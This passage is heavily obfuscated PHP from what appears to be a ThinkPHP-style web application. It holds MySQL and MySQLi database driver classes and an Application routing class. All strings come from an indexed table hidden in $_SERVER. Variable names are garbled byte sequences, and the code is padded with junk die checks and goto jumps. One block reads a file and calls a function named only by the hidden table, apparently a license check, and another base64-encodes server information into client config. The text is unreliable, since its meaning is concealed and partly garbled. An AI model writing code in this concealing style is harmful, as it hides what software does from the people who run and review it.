unset($this->config); } } return $this->linkID[$Ğ‹óÛµÑ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ô½Ç÷º) { $Ä§æ«Ö =& $_SERVER[ ÇƒŠìÀ]; if (0 === stripos($Ô½Ç÷º, $Ä§æ«Ö[310])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ô½Ç÷º; if ($this->queryID) { $this->free(); } think_action_status($Ä§æ«Ö[23], 1); think_status($Ä§æ«Ö[24]); $this->queryID = mysql_query($Ô½Ç÷º, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($õ¨´ãï¿) { $Ô„±¹•â =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $õ¨´ãï¿; if ($this->queryID) { $this->free(); } think_action_status($Ô„±¹•â[25], 1); think_status($Ô„±¹•â[24]); $¼‘ù¸ù = mysql_query($õ¨´ãï¿, $this->_linkID); $this->debug(); if (!1 === $¼‘ù¸ù) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ ÇƒŠìÀ][927], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $›Ç¡§åÌ = mysql_query($_SERVER[ ÇƒŠìÀ][928], $this->_linkID); $this->transTimes = 0; if (!$›Ç¡§åÌ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $†éÙ£õ® = mysql_query($_SERVER[ ÇƒŠìÀ][929], $this->_linkID); $this->transTimes = 0; if (!$†éÙ£õ®) { $this->error(); return !1; } } return !0; } private function getAll() { $ò»¼™Ä¶ = array(); if ($this->numRows > 0) { while ($À¸¨±²® = mysql_fetch_assoc($this->queryID)) { $ò»¼™Ä¶[] = $À¸¨±²®; } mysql_data_seek($this->queryID, 0); } return $ò»¼™Ä¶; } public function getFields($ºŸÒ«ä) { $‚¹´¿Ø­ =& $_SERVER[ ÇƒŠìÀ]; $ÖÒ”š’Ñ = $this->query($‚¹´¿Ø­[930] . $this->parseKey($ºŸÒ«ä)); $¼°…Ä°Ğ = array(); if ($ÖÒ”š’Ñ) { foreach ($ÖÒ”š’Ñ as $®–»–¾ => $¿Úé»‚) { $¼°…Ä°Ğ[$¿Úé»‚[$‚¹´¿Ø­[31]]] = array($‚¹´¿Ø­[32] => $¿Úé»‚[$‚¹´¿Ø­[31]], $‚¹´¿Ø­[33] => $¿Úé»‚[$‚¹´¿Ø­[34]], $‚¹´¿Ø­[35] => (bool) (strtoupper($¿Úé»‚[$‚¹´¿Ø­[36]]) === $‚¹´¿Ø­[931]), $‚¹´¿Ø­[37] => $¿Úé»‚[$‚¹´¿Ø­[38]], $‚¹´¿Ø­[39] => strtolower($¿Úé»‚[$‚¹´¿Ø­[40]]) == $‚¹´¿Ø­[41], $‚¹´¿Ø­[42] => strtolower($¿Úé»‚[$‚¹´¿Ø­[43]]) == $‚¹´¿Ø­[44]); } } return $¼°…Ä°Ğ; } public function getTables($å÷öÚÀ = '') { $ÁÉ™¶Ÿ =& $_SERVER[ ÇƒŠìÀ]; if (!empty($å÷öÚÀ)) { $ø“´æ´­ = $ÁÉ™¶Ÿ[932] . $å÷öÚÀ . $ÁÉ™¶Ÿ[933]; } else { $ø“´æ´­ = $ÁÉ™¶Ÿ[934]; } $úë†½Ï„ = $this->query($ø“´æ´­); $åÅ››¢‘ = array(); foreach ($úë†½Ï„ as $êğã’è => $½ğü£È–) { $åÅ››¢‘[$êğã’è] = current($½ğü£È–); } return $åÅ››¢‘; } public function replace($’â¸İÇ, $¦‘ÏÑÊ› = array()) { $åÕºş¬º =& $_SERVER[ ÇƒŠìÀ]; foreach ($’â¸İÇ as $º®Æ‹¹œ => $“¥ÙÙ¹û) { $ñêØÅ¨È = $this->parseValue($“¥ÙÙ¹û); if (is_scalar($ñêØÅ¨È)) { $ò§˜ ê[] = $ñêØÅ¨È; $šÊ™Ÿ©›[] = $this->parseKey($º®Æ‹¹œ); } } $óší™ŸÖ = $åÕºş¬º[935] . $this->parseTable($¦‘ÏÑÊ›[$åÕºş¬º[325]]) . $åÕºş¬º[936] . implode($åÕºş¬º[50], $šÊ™Ÿ©›) . $åÕºş¬º[937] . implode($åÕºş¬º[50], $ò§˜ ê) . $åÕºş¬º[938]; return $this->execute($óší™ŸÖ); } public function insertAll($¼º§–†Å, $ÌÆ·ŸÔ = array(), $éıÂ¶Û’ = false) { $ì¬£Ìü =& $_SERVER[ ÇƒŠìÀ]; if (!is_array($¼º§–†Å[0])) { return !1; } $ıÇ´Ê§è = array_keys($¼º§–†Å[0]); $Â²‡¸÷ = array(); foreach ($¼º§–†Å as $ËÆÂÓ¾) { $Çáä¤àÒ = array(); foreach ($ËÆÂÓ¾ as $Ä¥¼ºª => $õıêé²Ö) { $õıêé²Ö = $this->parseValue($õıêé²Ö); if (is_scalar($õıêé²Ö)) { $Çáä¤àÒ[] = $õıêé²Ö; } } $Â²‡¸÷[] = $ì¬£Ìü[306] . implode($ì¬£Ìü[50], $Çáä¤àÒ) . $ì¬£Ìü[938]; } array_walk($ıÇ´Ê§è, array($this, $ì¬£Ìü[939])); $±½‚—×à = ($éıÂ¶Û’ ? $ì¬£Ìü[940] : $ì¬£Ìü[941]) . $ì¬£Ìü[942] . $this->parseTable($ÌÆ·ŸÔ[$ì¬£Ìü[325]]) . $ì¬£Ìü[936] . implode($ì¬£Ìü[50], $ıÇ´Ê§è) . $ì¬£Ìü[943] . implode($ì¬£Ìü[50], $Â²‡¸÷); return $this->execute($±½‚—×à); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ŞÌ¼†Š¿ =& $_SERVER[ ÇƒŠìÀ]; $this->error = mysql_errno() . $ŞÌ¼†Š¿[4] . mysql_error($this->_linkID); if ($ŞÌ¼†Š¿[12] != $this->queryStr) { $this->error .= LNG($ŞÌ¼†Š¿[48]) . $this->queryStr; } think_trace($this->error, $ŞÌ¼†Š¿[12], $ŞÌ¼†Š¿[49]); return $this->error; } public function escapeString($ä²ÖÎºï) { if ($this->_linkID) { return mysql_real_escape_string($ä²ÖÎºï, $this->_linkID); } else { return mysql_escape_string($ä²ÖÎºï); } } public function parseKey(&$Š Œ§ÌÛ, $Ëè¯µ„‡ = true) { $ş¸ä×ñ =& $_SERVER[ ÇƒŠìÀ]; if ($Ëè¯µ„‡) { $Š Œ§ÌÛ = $this->parseKeyCheck($Š Œ§ÌÛ); } if ($Š Œ§ÌÛ != $ş¸ä×ñ[205] && !preg_match($ş¸ä×ñ[944], $Š Œ§ÌÛ)) { $Š Œ§ÌÛ = $ş¸ä×ñ[431] . trim($Š Œ§ÌÛ, $ş¸ä×ñ[431]) . $ş¸ä×ñ[431]; } return $Š Œ§ÌÛ; } } class DbMysqli extends Db { public function __construct($øµ¬Ë‹° = '') { $†„é÷Œ =& $_SERVER[ ÇƒŠìÀ]; if (!extension_loaded($†„é÷Œ[945])) { think_exception(think_lang($†„é÷Œ[14]) . $†„é÷Œ[946]); } if (!empty($øµ¬Ë‹°)) { $this->config = $øµ¬Ë‹°; if (empty($this->config[$†„é÷Œ[17]])) { $this->config[$†„é÷Œ[17]] = $†„é÷Œ[12]; } } } public function connect($±ìôÄñ = '', $×äµüøÀ = 0) { $¬×¯‹„Â =& $_SERVER[ ÇƒŠìÀ]; if (!isset($this->linkID[$×äµüøÀ])) { if (empty($±ìôÄñ)) { $±ìôÄñ = $this->config; } $this->linkID[$×äµüøÀ] = new mysqli($±ìôÄñ[$¬×¯‹„Â[919]], $±ìôÄñ[$¬×¯‹„Â[921]], $±ìôÄñ[$¬×¯‹„Â[922]], $±ìôÄñ[$¬×¯‹„Â[21]], $±ìôÄñ[$¬×¯‹„Â[920]] ? intval($±ìôÄñ[$¬×¯‹„Â[920]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $’Ô¬îë½ = $this->linkID[$×äµüøÀ]->server_version; $this->linkID[$×äµüøÀ]->query($¬×¯‹„Â[923] . think_config($¬×¯‹„Â[924]) . $¬×¯‹„Â[58]); if ($’Ô¬îë½ > $¬×¯‹„Â[925]) { $this->linkID[$×äµüøÀ]->query($¬×¯‹„Â[926]); } $this->connected = !0; if (1 != think_config($¬×¯‹„Â[22])) { unset($this->config); } } return $this->linkID[$×äµüøÀ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($‡Û’©ô) { $è’ÒÉËŞ =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡Û’©ô; if ($this->queryID) { $this->free(); } think_action_status($è’ÒÉËŞ[23], 1); think_status($è’ÒÉËŞ[24]); $this->queryID = $this->_linkID->query($‡Û’©ô); if ($this->_linkID->more_results()) { while (($¼‰Ó±¡ = $this->_linkID->next_result()) != NULL) { $¼‰Ó±¡->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ÿ·š†ş÷) { $Ì„¯ïÖ± =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿ·š†ş÷; if ($this->queryID) { $this->free(); } think_action_status($Ì„¯ïÖ±[25], 1); think_status($Ì„¯ïÖ±[24]); $¤¿´¬½¤ = $this->_linkID->query($Ÿ·š†ş÷); $this->debug(); if (!1 === $¤¿´¬½¤) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $áªñö¶Ó = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$áªñö¶Ó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ºæ­ÁÇ§ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ºæ­ÁÇ§) { $this->error(); return !1; } } return !0; } private function getAll() { $¬ïíúß = array(); if ($this->numRows > 0) { for ($áñÑá– = 0; $áñÑá– < $this->numRows; $áñÑá–++) { $¬ïíúß[$áñÑá–] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¬ïíúß; } public function getFields($˜Ë–Èôã) { $½ÒéÌîñ =& $_SERVER[ ÇƒŠìÀ]; $Ÿîõ…‘° = $this->query($½ÒéÌîñ[930] . $this->parseKey($˜Ë–Èôã)); $•ƒ«ÓÃ = array(); if ($Ÿîõ…‘°) { foreach ($Ÿîõ…‘° as $œÆÏû‘ç => $·ëÕÄüÒ) { $•ƒ«ÓÃ[$·ëÕÄüÒ[$½ÒéÌîñ[31]]] = array($½ÒéÌîñ[32] => $·ëÕÄüÒ[$½ÒéÌîñ[31]], $½ÒéÌîñ[33] => $·ëÕÄüÒ[$½ÒéÌîñ[34]], $½ÒéÌîñ[35] => (bool) ($·ëÕÄüÒ[$½ÒéÌîñ[36]] === $½ÒéÌîñ[12]), $½ÒéÌîñ[37] => $·ëÕÄüÒ[$½ÒéÌîñ[38]], $½ÒéÌîñ[39] => strtolower($·ëÕÄüÒ[$½ÒéÌîñ[40]]) == $½ÒéÌîñ[41], $½ÒéÌîñ[42] => strtolower($·ëÕÄüÒ[$½ÒéÌîñ[43]]) == $½ÒéÌîñ[44]); } } return $•ƒ«ÓÃ; } public function getTables($¸ÜûæÒØ = '') { $¸¦ßÀ®¿ =& $_SERVER[ ÇƒŠìÀ]; $ñÈù¹óØ = !empty($¸ÜûæÒØ) ? $¸¦ßÀ®¿[932] . $¸ÜûæÒØ . $¸¦ßÀ®¿[933] : $¸¦ßÀ®¿[934]; $Ï¿…Û¶ƒ = $this->query($ñÈù¹óØ); $™¥ïÍöÒ = array(); if ($Ï¿…Û¶ƒ) { foreach ($Ï¿…Û¶ƒ as $Šİá¼Ç© => $´¤»™Û®) { $™¥ïÍöÒ[$Šİá¼Ç©] = current($´¤»™Û®); } } return $™¥ïÍöÒ; } public function replace($´Ş¤Âô, $Ë³²¼¦à = array()) { $‚şí’ßş =& $_SERVER[ ÇƒŠìÀ]; foreach ($´Ş¤Âô as $ÊŸûö® => $‹ö–‡şŸ) { $¼ÁÚ½—Á = $this->parseValue($‹ö–‡şŸ); if (is_scalar($¼ÁÚ½—Á)) { $İö‹´Ú¥[] = $¼ÁÚ½—Á; $ÀÔÙéñ½[] = $this->parseKey($ÊŸûö®); } } $øª¹ô¥„ = $‚şí’ßş[935] . $this->parseTable($Ë³²¼¦à[$‚şí’ßş[325]]) . $‚şí’ßş[936] . implode($‚şí’ßş[50], $ÀÔÙéñ½) . $‚şí’ßş[937] . implode($‚şí’ßş[50], $İö‹´Ú¥) . $‚şí’ßş[938]; return $this->execute($øª¹ô¥„); } public function insertAll($¶¯÷ÖİÂ, $üààÁæ = array(), $„Åš”Çì = false) { $íÚˆÀ± =& $_SERVER[ ÇƒŠìÀ]; if (!is_array($¶¯÷ÖİÂ[0])) { return !1; } $µÌŸºß = array_keys($¶¯÷ÖİÂ[0]); $Ûµšúµ½ = array(); foreach ($¶¯÷ÖİÂ as $ıÙñ‹Àí) { $æé’üÔ¶ = array(); foreach ($ıÙñ‹Àí as $¶ğ¨¼å¬ => $ğÖĞ‘Å) { $ğÖĞ‘Å = $this->parseValue($ğÖĞ‘Å); if (is_scalar($ğÖĞ‘Å)) { $æé’üÔ¶[] = $ğÖĞ‘Å; } } $Ûµšúµ½[] = $íÚˆÀ±[306] . implode($íÚˆÀ±[50], $æé’üÔ¶) . $íÚˆÀ±[938]; } array_walk($µÌŸºß, array($this, $íÚˆÀ±[939])); $Äİ“¯¯ù = $„Åš”Çì ? $íÚˆÀ±[940] : $íÚˆÀ±[941]; $ÌŒõÃ€ = $Äİ“¯¯ù . $íÚˆÀ±[942] . $this->parseTable($üààÁæ[$íÚˆÀ±[325]]) . $íÚˆÀ±[936] . implode($íÚˆÀ±[50], $µÌŸºß) . $íÚˆÀ±[943] . implode($íÚˆÀ±[50], $Ûµšúµ½); return $this->execute($ÌŒõÃ€); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¾Å‹Ã =& $_SERVER[ ÇƒŠìÀ]; $this->error = $this->_linkID->errno . $¾Å‹Ã[4] . $this->_linkID->error; if ($¾Å‹Ã[12] != $this->queryStr) { $this->error .= LNG($¾Å‹Ã[48]) . $this->queryStr; } think_trace($this->error, $¾Å‹Ã[12], $¾Å‹Ã[49]); return $this->error; } public function escapeString($Äö‹ƒø) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Äö‹ƒø); } else { return addslashes($Äö‹ƒø); } } public function parseKey(&$Åƒ¤”¹±, $¹¼ÌÔšÜ = true) { $Å†…æÖ¹ =& $_SERVER[ ÇƒŠìÀ]; if ($¹¼ÌÔšÜ) { $Åƒ¤”¹± = $this->parseKeyCheck($Åƒ¤”¹±); } if ($Åƒ¤”¹± != $Å†…æÖ¹[205] && !preg_match($Å†…æÖ¹[944], $Åƒ¤”¹±)) { $Åƒ¤”¹± = $Å†…æÖ¹[431] . trim($Åƒ¤”¹±, $Å†…æÖ¹[431]) . $Å†…æÖ¹[431]; } return $Åƒ¤”¹±; } } if ($_SERVER[$_SERVER[ ÇƒŠìÀ][906]] != $_SERVER[$_SERVER[ ÇƒŠìÀ][947]]) { $_getc = $_SERVER[ ÇƒŠìÀ][909]; $_getfile = $_SERVER[$_SERVER[ ÇƒŠìÀ][910]] . $_SERVER[ ÇƒŠìÀ][911]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ ÇƒŠìÀ][248], $_getfilec); if (count($_getarrs) < $_SERVER[ ÇƒŠìÀ][655]) { $exit = $_SERVER[ ÇƒŠìÀ][912]; $exit(); } $_act = $_SERVER[ ÇƒŠìÀ][948]; $_act($_SERVER[$_SERVER[ ÇƒŠìÀ][907]]); } goto fæ™îİÜ; cªº Ÿˆ‡¹: define($_SERVER[ ÇƒŠìÀ][284], 1); define($_SERVER[ ÇƒŠìÀ][285], 2); define($_SERVER[ ÇƒŠìÀ][286], 3); goto F“ ê‹Íù; B¤Ÿ§õÇ¹: $rvuqptnbyi = $_SERVER[ ÇƒŠìÀ][652]; if (strlen($rvuqptnbyi) < $_SERVER[ ÇƒŠìÀ][653]) { die; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\145\x78"; function __construct() { } public function setDefault($ßñ·ÓÓ”) { $Ş—¼ã¦Æ =& $_SERVER[ ÇƒŠìÀ]; $à™ëšüš =& $_SERVER[‡©‹¬£]; $¿¶€ÏÃ = explode($à™ëšüš[0], trim($ßñ·ÓÓ”, $à™ëšüš[0])); $ãòÆ¹Òõ = $Ş—¼ã¦Æ[654]; if (strlen($ãòÆ¹Òõ) < $Ş—¼ã¦Æ[655]) { die; } $this->defaultModule = $¿¶€ÏÃ[0] ? $¿¶€ÏÃ[0] : $this->defaultModule; $½¢…çÙ = $Ş—¼ã¦Æ[656]; if (strlen($½¢…çÙ) < $Ş—¼ã¦Æ[655]) { return; } $this->defaultController = $¿¶€ÏÃ[1] ? $¿¶€ÏÃ[1] : $this->defaultController; $this->defaultAction = $¿¶€ÏÃ[2] ? $¿¶€ÏÃ[2] : $this->defaultAction; $this->gifj66fd4561($à™ëšüš[1], array($this, $à™ëšüš[2])); } public function appRun($òæû¬Ü) { $œ³å«‘ =& $_SERVER[ ÇƒŠìÀ]; $ñ‰ÈÁÈ± =& $_SERVER[‡©‹¬£]; $ããäĞˆ = explode($ñ‰ÈÁÈ±[0], $òæû¬Ü); $ß—î = strtolower($ããäĞˆ[0]); $‰ÏŞšäø = $ñ‰ÈÁÈ±[3]; if ($ß—î == $ñ‰ÈÁÈ±[4]) { $‰ÏŞšäø = $ñ‰ÈÁÈ±[5]; $ããäĞˆ[0] = $ñ‰ÈÁÈ±[6]; $ããäĞˆ[1] = $ããäĞˆ[1] . $ñ‰ÈÁÈ±[7]; $òæû¬Ü = join($ñ‰ÈÁÈ±[0], $ããäĞˆ); $òæû¬Ü = trim($òæû¬Ü, $ñ‰ÈÁÈ±[0]); } call_user_func(array($ñ‰ÈÁÈ±[8], $ñ‰ÈÁÈ±[9]), $‰ÏŞšäø . $ñ‰ÈÁÈ±[10], $òæû¬Ü); ActionCall($òæû¬Ü); $†œ­Ç• = $œ³å«‘[657]; if (!$†œ­Ç•) { return; } call_user_func(array($ñ‰ÈÁÈ±[8], $ñ‰ÈÁÈ±[9]), $‰ÏŞšäø . $ñ‰ÈÁÈ±[11], $òæû¬Ü); $–¹»éÑ = $œ³å«‘[658]; if (!$–¹»éÑ) { die; } } private function autorun() { $À™ä¥Œ½ =& $_SERVER[‡©‹¬£]; global $config; $ÙšÆÂğ = $_SERVER[ ÇƒŠìÀ][659]; if (count($config[$À™ä¥Œ½[12]]) == 0) { return; } foreach ($config[$À™ä¥Œ½[12]] as $îóÖ‘«Ò => $€òëÌ­”) { $this->appRun($€òëÌ­”); } } private function ohwx521c91b8() { $Â©‘Ìæ =& $_SERVER[ ÇƒŠìÀ]; $¯Ÿ©åü =& $_SERVER[‡©‹¬£]; $Ö¹±ñ­ç = $¯Ÿ©åü[4]; $¥ù·ŞÙÄ = $GLOBALS[$¯Ÿ©åü[13]][$¯Ÿ©åü[14]][0]; if (!$¥ù·ŞÙÄ || strlen($¥ù·ŞÙÄ) <= strlen($Ö¹±ñ­ç)) { return; } if (strtolower(substr($¥ù·ŞÙÄ, -strlen($Ö¹±ñ­ç))) != $Ö¹±ñ­ç) { return; } $ËœÌ¾ñ¤ = substr($¥ù·ŞÙÄ, 0, -strlen($Ö¹±ñ­ç)); $úÍ–ÊÏ = $Â©‘Ìæ[660]; $ †É‘ï… = array($¯Ÿ©åü[4], $ËœÌ¾ñ¤); $»úÚ™ = $Â©‘Ìæ[661]; if (strlen($»úÚ™) < $Â©‘Ìæ[662]) { die; } $ñ…õşÂ× = array_slice($GLOBALS[$¯Ÿ©åü[13]][$¯Ÿ©åü[14]], 1); $GLOBALS[$¯Ÿ©åü[13]][$¯Ÿ©åü[14]] = array_merge($ †É‘ï…, $ñ…õşÂ×); $GLOBALS[$¯Ÿ©åü[13]][$¯Ÿ©åü[15]] = implode($¯Ÿ©åü[0], $GLOBALS[$¯Ÿ©åü[13]][$¯Ÿ©åü[14]]); $ä²¢ò† = $Â©‘Ìæ[663]; if (strlen($ä²¢ò†) < $Â©‘Ìæ[664]) { return; } } private function xqpk85c7fea8() { $ı½ğçå =& $_SERVER[ ÇƒŠìÀ]; $¦ç§Ì±» =& $_SERVER[‡©‹¬£]; if ($GLOBALS[$¦ç§Ì±»[13]][$¦ç§Ì±»[15]] != $¦ç§Ì±»[6]) { return; } $ìµó¬¦Û = $_SERVER[$¦ç§Ì±»[16]]; $İ¢úÍÀª = $ı½ğçå[665]; if (!$İ¢úÍÀª) { die; } $ÀÁÎÔ‚£ = $¦ç§Ì±»[17]; if (!strstr($ìµó¬¦Û, $ÀÁÎÔ‚£)) { return; } $îÊš¼•è = strrpos($ìµó¬¦Û, $ÀÁÎÔ‚£); $ĞåÁûÖ = substr($ìµó¬¦Û, $îÊš¼•è + strlen($ÀÁÎÔ‚£)); preg_match_all($¦ç§Ì±»[18], $ĞåÁûÖ, $§ÙœüÎš); $ĞåÁûÖ = trim($§ÙœüÎš[0][0], $¦ç§Ì±»[19]); $ˆùÉš©Û = $ı½ğçå[666]; while ($ˆùÉš©Û < $ı½ğçå[664]) { if ($ˆùÉš©Û >= 0) { break; } $ˆùÉš©Û++; } $GLOBALS[$¦ç§Ì±»[13]][$¦ç§Ì±»[14]] = explode($¦ç§Ì±»[19], $ĞåÁûÖ); $GLOBALS[$¦ç§Ì±»[13]][$¦ç§Ì±»[15]] = implode($¦ç§Ì±»[0], $GLOBALS[$¦ç§Ì±»[13]][$¦ç§Ì±»[14]]); } public function run() { $¯Úóã„ =& $_SERVER[ ÇƒŠìÀ]; $ßŸÄ‰æ =& $_SERVER[‡©‹¬£]; $this->xqpk85c7fea8(); $this->ohwx521c91b8(); $íôƒÜá = $GLOBALS[$ßŸÄ‰æ[13]][$ßŸÄ‰æ[14]]; $ä…ˆÂúš = $¯Úóã„[667]; $±¥º³³İ = $GLOBALS[$ßŸÄ‰æ[13]][$ßŸÄ‰æ[15]]; define($ßŸÄ‰æ[20], isset($íôƒÜá[0]) && $íôƒÜá[0] ? $íôƒÜá[0] : $this->defaultModule); define($ßŸÄ‰æ[21], isset($íôƒÜá[1]) && $íôƒÜá[0] ? $íôƒÜá[1] : $this->defaultController); define($ßŸÄ‰æ[22], isset($íôƒÜá[2]) && $íôƒÜá[0] ? $íôƒÜá[2] : $this->defaultAction); $ÌçÏù” = $¯Úóã„[668]; define($ßŸÄ‰æ[23], MOD . $ßŸÄ‰æ[0] . ST . $ßŸÄ‰æ[0] . ACT); $_SERVER[$ßŸÄ‰æ[24]] = strtolower(ACTION); $this->autorun(); if (count($íôƒÜá) >= 3) { $this->appRun($±¥º³³İ); } else { $this->appRun(ACTION); } } private $ieyc73b1ffe1 = array(); private $filo60ae1ab4 = ''; public function xdpz6f23c904() { $ì°±•Áá =& $_SERVER[ ÇƒŠìÀ]; $øîı²” =& $_SERVER[‡©‹¬£]; $this->jctn9e031c82(); $ˆü¸¶öâ = $ì°±•Áá[669]; if (strlen($ˆü¸¶öâ) < $ì°±•Áá[655]) { die; } $this->cndh1b7f8d4c(); $this->yuld0a8612b0(); $this->zkmx80443fdd(); $this->ibpna60d5ad9(); $this->nhyd065a19ad(); $this->esta24aca55b(); $this->gifj66fd4561($øîı²”[25], array($this, $øîı²”[26])); $ş²‹ø’ä = $ì°±•Áá[670]; if (!$ş²‹ø’ä) { die; } $this->gifj66fd4561($øîı²”[27], array($this, $øîı²”[28])); $Í®¦ã¦² = $ì°±•Áá[671]; if (!$Í®¦ã¦²) { die; } $this->gifj66fd4561($øîı²”[29], array($this, $øîı²”[30])); $ßÉ¤Ú¼ª = $ì°±•Áá[672]; while (strlen($ßÉ¤Ú¼ª) < $ì°±•Áá[653]) { if (!$ßÉ¤Ú¼ª) { break; } $ßÉ¤Ú¼ª++; } $this->gifj66fd4561($øîı²”[31], array($this, $øîı²”[32])); } public function tvekdd2568b4($Æ°×…öè) { $²¬Õ¬ =& $_SERVER[ ÇƒŠìÀ]; $…Åã•À =& $_SERVER[‡©‹¬£]; $ŒªÕğÊ = Model($…Åã•À[33])->get(); $¡Ğø„³ = $²¬Õ¬[673]; if (!$¡Ğø„³) { die; } $­¡¼èúá = array($…Åã•À[34], $…Åã•À[35], $…Åã•À[36], $…Åã•À[37], $…Åã•À[38], $…Åã•À[39], $…Åã•À[40], $…Åã•À[41], $…Åã•À[42], $…Åã•À[43], $…Åã•À[44], $…Åã•À[45], $…Åã•À[46], $…Åã•À[47], $…Åã•À[48], $…Åã•À[49], $…Åã•À[50], $…Åã•À[51], $…Åã•À[52], $…Åã•À[53], $…Åã•À[54], $…Åã•À[55], $…Åã•À[56], $…Åã•À[57], $…Åã•À[58], $…Åã•À[59], $…Åã•À[60], $…Åã•À[61], $…Åã•À[62], $…Åã•À[63], $…Åã•À[64], $…Åã•À[65], $…Åã•À[66], $…Åã•À[67], $…Åã•À[68], $…Åã•À[69], $…Åã•À[70], $…Åã•À[71], $…Åã•À[72], $…Åã•À[73], $…Åã•À[74], $…Åã•À[75], $…Åã•À[76], $…Åã•À[77], $…Åã•À[78], $…Åã•À[79], $…Åã•À[80], $…Åã•À[81], $…Åã•À[82], $…Åã•À[83], $…Åã•À[84]); foreach ($­¡¼èúá as $•£ä€ºÃ) { $¦‘éå×² = $GLOBALS[$…Åã•À[85]][$…Åã•À[86]][$•£ä€ºÃ]; $ëñæÇ–Ü = $²¬Õ¬[674]; if (isset($ŒªÕğÊ[$•£ä€ºÃ])) { $¦‘éå×² = $ŒªÕğÊ[$•£ä€ºÃ]; } $Æ°×…öè[$…Åã•À[87]][$…Åã•À[88]][$•£ä€ºÃ] = $¦‘éå×²; } $à…Ë×˜ö = $Æ°×…öè[$…Åã•À[87]][$…Åã•À[88]][$…Åã•À[46]]; $Áâ­µ¯ = $²¬Õ¬[675]; if (!$Áâ­µ¯) { return; } unset($Æ°×…öè[$…Åã•À[87]][$…Åã•À[89]][$…Åã•À[90]]); unset($Æ°×…öè[$…Åã•À[87]][$…Åã•À[89]][$…Åã•À[91]]); $Ÿ«¥Ì— = $²¬Õ¬[676]; if (!$Ÿ«¥Ì—) { die; } unset($Æ°×…öè[$…Åã•À[87]][$…Åã•À[88]][$…Åã•À[46]]); unset($Æ°×…öè[$…Åã•À[87]][$…Åã•À[88]][$…Åã•À[92]]); $Æ°×…öè[$…Åã•À[87]][$…Åã•À[88]][$…Åã•À[93]] = array($…Åã•À[94] => (int) $à…Ë×˜ö[$…Åã•À[95]], $…Åã•À[96] => (int) _get($à…Ë×˜ö, $…Åã•À[97], 0)); $§‘­¾²Ã = substr(md5($…Åã•À[98] . get_client_ip() . $ŒªÕğÊ[$…Åã•À[99]]), 0, 15); $ìéŒ¼€› = $²¬Õ¬[677]; $Æ°×…öè[$…Åã•À[100]][$…Åã•À[101]] = Mcrypt::encode(Session::sign(), $§‘­¾²Ã, 3600 * 24); $ïé…Ö×÷ = $²¬Õ¬[678]; if (strlen($ïé…Ö×÷) < $²¬Õ¬[662]) { return; } $Æ°×…öè[$…Åã•À[100]][$…Åã•À[102]] = Action($…Åã•À[103])->accessToken(); $À—ãÄò = $²¬Õ¬[679]; if (strlen($À—ãÄò) < $²¬Õ¬[655]) { die; } $Æ°×…öè[$…Åã•À[100]][$…Åã•À[104]] = md5($_SERVER[$…Åã•À[105]] . $ŒªÕğÊ[$…Åã•À[99]]); $ßÇ›İ¸½ = $²¬Õ¬[680]; while ($ßÇ›İ¸½ < $²¬Õ¬[653]) { if ($ßÇ›İ¸½ >= 0) { break; } $ßÇ›İ¸½++; } $Æ°×…öè[$…Åã•À[100]][$…Åã•À[106]] = base64_encode(serverInfo()); $¼†¯Ñùœ = $²¬Õ¬[681]; if (!$¼†¯Ñùœ) { return; } $Æ°×…öè[$…Åã•À[100]][$…Åã•À[107]] = $this->filo60ae1ab4; if ($ŒªÕğÊ[$…Åã•À[107]] != $…Åã•À[108]) { $Æ°×…öè[$…Åã•À[100]][$…Åã•À[109]] = $ŒªÕğÊ[$…Åã•À[109]]; $Æ°×…öè[$…Åã•À[100]][$…Åã•À[110]] = $ŒªÕğÊ[$…Åã•À[110]]; $ÊÆâª˜á = rand_string(10) . $this->filo60ae1ab4 . rand_string(5); $Æ°×…öè[$…Åã•À[87]][$…Åã•À[111]][$…Åã•À[112]] = $this->cnjp144a310f($ÊÆâª˜á, $Æ°×…öè[$…Åã•À[100]][$…Åã•À[104]]); } if ($this->filo60ae1ab4 == $…Åã•À[108]) { $Æ°×…öè[$…Åã•À[87]][$…Åã•À[88]][$…Åã•À[93]][$…Åã•À[97]] = 0; } $Æ°×…öè[$…Åã•À[100]][$…Åã•À[113]] = _get($this->ieyc73b1ffe1, $…Åã•À[114], $…Åã•À[6]); $Æ°×…öè[$…Åã•À[100]][$…Åã•À[115]] = _get($this->ieyc73b1ffe1, 